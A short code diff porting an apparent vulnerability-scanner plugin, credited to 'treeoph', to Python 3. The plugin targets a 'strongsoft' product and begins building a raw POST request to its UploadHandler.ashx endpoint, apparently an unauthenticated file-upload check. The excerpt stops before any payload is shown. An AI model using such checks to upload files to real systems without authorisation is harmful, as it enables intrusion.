@@ -1,13 +1,13 @@
 #!/usr/bin/env python
 # -*- coding: utf-8 -*-
 #__Author__ = treeoph
-import re,urlparse
+import re,urllib.parse
 def assign(service, arg):
     if service=='strongsoft':
         return True,arg
 
 def audit(arg):
-    p=urlparse.urlparse(arg)
+    p=urllib.parse.urlparse(arg)
     raw='''POST /SysManage/AjaxHandler/UploadHandler.ashx HTTP/1.1
 Host: {netloc}
 Content-Length: 1305
